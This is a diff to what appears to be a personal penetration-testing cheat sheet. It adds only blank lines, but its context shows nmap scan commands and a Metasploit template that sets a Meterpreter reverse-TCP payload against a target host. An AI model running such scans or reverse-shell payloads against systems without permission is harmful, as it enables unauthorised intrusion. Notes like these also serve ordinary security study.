@@ -25,9 +25,12 @@ nmap scan types
 nmap 10.10.10.10 #Top 1000 ports (default scan)
 nmap -F 10.10.10.10 #Top 100 ports```
 
+
 |---------------------------------------------------------------------|
 |                                                                     |
 |---------------------------------------------------------------------|
+
+
 
 Mataspolite:
 ```search (the payload name)
@@ -37,6 +40,7 @@ set payload linux/x64/meterpreter_reverse_tcp # the payload
 set RHOST           # the target host
 run
 ```
+
 
 |---------------------------------------------------------------------|
 |                                                                     |
